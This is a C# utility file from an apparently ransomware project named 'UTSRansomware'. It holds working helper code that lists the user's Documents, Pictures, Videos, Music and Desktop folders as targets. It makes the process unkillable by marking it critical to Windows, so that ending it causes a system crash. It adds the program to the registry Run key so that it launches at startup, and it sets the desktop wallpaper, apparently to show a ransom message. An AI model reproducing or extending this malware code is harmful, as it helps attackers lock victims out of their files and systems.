using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace UTSRansomware
{
    public static class Utils
    {
        // Allows marking process as critical to Windows OS
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);

        // Allows setting of desktop background
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

        private const int SPI_SETDESKWALLPAPER = 20;
        private  const int SPIF_UPDATEINIFILE = 0x1;
        private const int SPIF_SENDCHANGE = 0x2;

        // Array of SpecialFolders
        public static Environment.SpecialFolder[] specialFolders = {
        Environment.SpecialFolder.MyDocuments,
        Environment.SpecialFolder.MyPictures,
        Environment.SpecialFolder.MyVideos,
        Environment.SpecialFolder.MyMusic,
        Environment.SpecialFolder.Desktop,
    };

        // Function that will cause BSOD if process terminated
        public static void makeProcessUnkillable()
        {
            Process.EnterDebugMode();
            RtlSetProcessIsCritical(1, 0, 0);
        }

        // Makes program launch on startup
        public static void AddToStartup()
        {
            string appName = "YourAppName";
            string appPath = System.Reflection.Assembly.GetExecutingAssembly().Location;

            RegistryKey startupKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            startupKey.SetValue(appName, appPath);
        }

        // Sets desktop background from file path
        public static void SetDesktopBackground(string filePath)
        {
            // Call SystemParametersInfo function to set the desktop wallpaper
            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, filePath, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
        }
    }
}
